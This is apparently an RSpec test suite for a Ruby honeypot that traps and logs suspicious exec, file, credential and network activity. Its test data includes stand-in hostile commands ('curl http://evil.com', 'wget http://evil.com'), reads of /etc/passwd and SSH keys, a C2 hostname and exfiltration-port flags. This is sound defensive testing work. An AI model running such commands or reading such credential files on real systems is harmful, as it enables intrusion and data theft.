# frozen_string_literal: true

require "rspec"
require "json"
require "tmpdir"
require "fileutils"

require_relative "../capture_engine/exec_trap"
require_relative "../capture_engine/file_trap"
require_relative "../capture_engine/credential_trap"
require_relative "../capture_engine/network_trap"

RSpec.describe RubyGuardian::Honeypot::CaptureEngine do
  let(:log_dir) { Dir.mktmpdir("rg_capture_test") }
  let(:sample_id) { "test-sample-001" }
  let(:logger) { Logger.new(File::NULL) }

  after { FileUtils.rm_rf(log_dir) }

  describe RubyGuardian::Honeypot::CaptureEngine::ExecTrap do
    subject(:trap) { described_class.new(log_dir: log_dir, sample_id: sample_id, logger: logger) }

    describe "#initialize" do
      it "sets sample_id and empty captures" do
        expect(trap.sample_id).to eq(sample_id) if trap.respond_to?(:sample_id)
        expect(trap.captures).to be_empty
      end
    end

    describe "#activate!" do
      after { trap.deactivate! }

      it "returns self for chaining" do
        expect(trap.activate!).to eq(trap)
      end

      it "records the start time" do
        trap.activate!
        expect(trap.started_at).to be_a(Time)
      end
    end

    describe "#record" do
      before { trap.activate! }
      after { trap.deactivate! }

      it "captures a system call record" do
        entry = trap.record(method: :system, command: "ls", args: ["-la"])
        expect(entry[:method]).to eq("system")
        expect(entry[:command]).to eq("ls")
        expect(entry[:args]).to eq(["-la"])
        expect(entry[:timestamp]).to be_a(String)
      end

      it "accumulates multiple captures" do
        trap.record(method: :system, command: "whoami")
        trap.record(method: :exec, command: "id")
        trap.record(method: :backtick, command: "uname -a")
        expect(trap.captures.size).to eq(3)
      end
    end

    describe "#summary" do
      before { trap.activate! }
      after { trap.deactivate! }

      it "returns correct statistics" do
        trap.record(method: :system, command: "curl http://evil.com")
        trap.record(method: :system, command: "wget http://evil.com")
        trap.record(method: :backtick, command: "id")

        summary = trap.summary
        expect(summary[:total_captures]).to eq(3)
        expect(summary[:unique_commands]).to eq(3)
        expect(summary[:methods_used]).to include("system" => 2, "backtick" => 1)
      end
    end

    describe "#flush_captures" do
      before { trap.activate! }
      after { trap.deactivate! }

      it "writes captures to JSON file" do
        trap.record(method: :system, command: "test")
        trap.flush_captures

        output_file = File.join(log_dir, "exec_captures_#{sample_id}.json")
        expect(File.exist?(output_file)).to be true

        data = JSON.parse(File.read(output_file), symbolize_names: true)
        expect(data[:captures].size).to eq(1)
      end

      it "does nothing when no captures exist" do
        expect { trap.flush_captures }.not_to raise_error
      end
    end

    describe "trap interception" do
      before { trap.activate! }
      after { trap.deactivate! }

      it "intercepts Kernel#system and returns false" do
        result = system("echo trapped")
        expect(result).to be false
        expect(trap.captures.any? { |c| c[:method] == "system" }).to be true
      end

      it "intercepts backticks and returns empty string" do
        result = `echo trapped`
        expect(result).to eq("")
        expect(trap.captures.any? { |c| c[:method] == "backtick" }).to be true
      end
    end
  end

  describe RubyGuardian::Honeypot::CaptureEngine::FileTrap do
    subject(:trap) { described_class.new(log_dir: log_dir, sample_id: sample_id, logger: logger) }

    describe "#initialize" do
      it "starts with empty captures" do
        expect(trap.captures).to be_empty
      end
    end

    describe "#record" do
      it "records a file operation" do
        entry = trap.record(operation: :read, path: "/etc/passwd")
        expect(entry[:operation]).to eq("read")
        expect(entry[:path]).to eq("/etc/passwd")
        expect(entry[:is_sensitive]).to be true
      end

      it "identifies sensitive paths" do
        sensitive = trap.record(operation: :read, path: "/home/user/.ssh/id_rsa")
        normal = trap.record(operation: :read, path: "/tmp/test.txt")

        expect(sensitive[:is_sensitive]).to be true
        expect(normal[:is_sensitive]).to be false
      end
    end

    describe "#summary" do
      it "aggregates operation statistics" do
        trap.record(operation: :read, path: "/tmp/a.txt")
        trap.record(operation: :read, path: "/tmp/b.txt")
        trap.record(operation: :write, path: "/tmp/c.txt")
        trap.record(operation: :delete, path: "/tmp/d.txt")

        summary = trap.summary
        expect(summary[:total_operations]).to eq(4)
        expect(summary[:operations_breakdown]).to include("read" => 2, "write" => 1, "delete" => 1)
        expect(summary[:unique_paths]).to eq(4)
      end
    end
  end

  describe RubyGuardian::Honeypot::CaptureEngine::CredentialTrap do
    let(:deploy_dir) { Dir.mktmpdir("rg_cred_deploy") }
    subject(:trap) do
      described_class.new(deploy_dir: deploy_dir, log_dir: log_dir, sample_id: sample_id, logger: logger)
    end

    after { FileUtils.rm_rf(deploy_dir) }

    describe "#deploy!" do
      it "creates honeytoken files" do
        tokens = trap.deploy!
        expect(tokens).not_to be_empty
        expect(tokens).to have_key(:aws_credentials)
        expect(tokens).to have_key(:ssh_private_key)
        expect(tokens).to have_key(:gem_credentials)
      end

      it "deploys files to the filesystem" do
        tokens = trap.deploy!
        tokens.each do |_name, info|
          expect(File.exist?(info[:deployed_path])).to be true
        end
      end
    end

    describe "#record_access" do
      it "records a honeytoken access event" do
        entry = trap.record_access(token_name: :aws_credentials, access_type: :read)
        expect(entry[:token_name]).to eq("aws_credentials")
        expect(entry[:access_type]).to eq("read")
        expect(trap.access_log.size).to eq(1)
      end
    end

    describe "#summary" do
      it "provides access summary" do
        trap.deploy!
        trap.record_access(token_name: :aws_credentials, access_type: :read)
        trap.record_access(token_name: :ssh_private_key, access_type: :read)

        summary = trap.summary
        expect(summary[:total_accesses]).to eq(2)
        expect(summary[:tokens_accessed]).to include("aws_credentials", "ssh_private_key")
      end
    end

    describe "#cleanup!" do
      it "removes deployed honeytoken files" do
        trap.deploy!
        paths = trap.deployed_tokens.values.map { |t| t[:deployed_path] }
        trap.cleanup!
        paths.each { |p| expect(File.exist?(p)).to be false }
      end
    end
  end

  describe RubyGuardian::Honeypot::CaptureEngine::NetworkTrap do
    subject(:trap) { described_class.new(log_dir: log_dir, sample_id: sample_id, logger: logger) }

    describe "#record" do
      it "captures a TCP connection attempt" do
        entry = trap.record(protocol: :tcp, destination: "evil.com", port: 443)
        expect(entry[:protocol]).to eq("tcp")
        expect(entry[:destination]).to eq("evil.com")
        expect(entry[:port]).to eq(443)
        expect(entry[:is_known_exfil_port]).to be true
      end

      it "flags known exfiltration ports" do
        entry_443 = trap.record(protocol: :tcp, destination: "x.com", port: 443)
        entry_4444 = trap.record(protocol: :tcp, destination: "x.com", port: 4444)
        entry_12345 = trap.record(protocol: :tcp, destination: "x.com", port: 12345)

        expect(entry_443[:is_known_exfil_port]).to be true
        expect(entry_4444[:is_known_exfil_port]).to be true
        expect(entry_12345[:is_known_exfil_port]).to be false
      end
    end

    describe "#record_dns" do
      it "captures a DNS resolution attempt" do
        entry = trap.record_dns(hostname: "malware-c2.evil.com")
        expect(entry[:hostname]).to eq("malware-c2.evil.com")
        expect(entry[:type]).to eq(:dns_resolution)
      end
    end

    describe "#summary" do
      it "aggregates network statistics" do
        trap.record(protocol: :tcp, destination: "1.2.3.4", port: 443)
        trap.record(protocol: :tcp, destination: "5.6.7.8", port: 80)
        trap.record(protocol: :udp, destination: "1.2.3.4", port: 53)
        trap.record_dns(hostname: "evil.com")

        summary = trap.summary
        expect(summary[:total_connections]).to eq(3)
        expect(summary[:dns_queries]).to eq(1)
        expect(summary[:unique_destinations]).to contain_exactly("1.2.3.4", "5.6.7.8")
        expect(summary[:protocols_used]).to include("tcp" => 2, "udp" => 1)
      end
    end

    describe "#flush_captures" do
      it "writes network captures to JSON" do
        trap.record(protocol: :tcp, destination: "test.com", port: 80)
        trap.flush_captures

        output_file = File.join(log_dir, "network_captures_#{sample_id}.json")
        expect(File.exist?(output_file)).to be true
      end
    end
  end
end
